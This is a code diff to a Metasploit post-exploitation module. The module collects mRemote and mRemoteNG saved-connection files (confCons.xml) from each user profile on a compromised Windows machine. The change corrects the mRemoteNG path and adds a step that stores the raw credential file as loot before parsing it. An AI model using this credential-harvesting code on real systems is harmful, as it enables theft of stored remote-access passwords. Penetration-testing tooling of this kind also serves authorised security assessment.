@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Post
     grab_user_profiles().each do |user|
       next if user['LocalAppData'] == nil
       tmpath  = user['LocalAppData'] + '\\Felix_Deimel\\mRemote\\confCons.xml'
-      ng_path = user['LocalAppData'] + '\\..\\Roaming\\mRemoteNG\\confCons.xml'
+      ng_path = user['AppData'] + '\\mRemoteNG\\confCons.xml'
       get_xml(tmpath)
       get_xml(ng_path)
     end
@@ -50,6 +50,8 @@ class MetasploitModule < Msf::Post
     begin
       if file_exist?(path)
         condata = read_file(path)
+        loot_path = store_loot('mremote.creds', 'text/xml', session, condata, path)
+        vprint_good("confCons.xml saved to #{loot_path}")
         parse_xml(condata)
         print_status("Finished processing #{path}")
       end
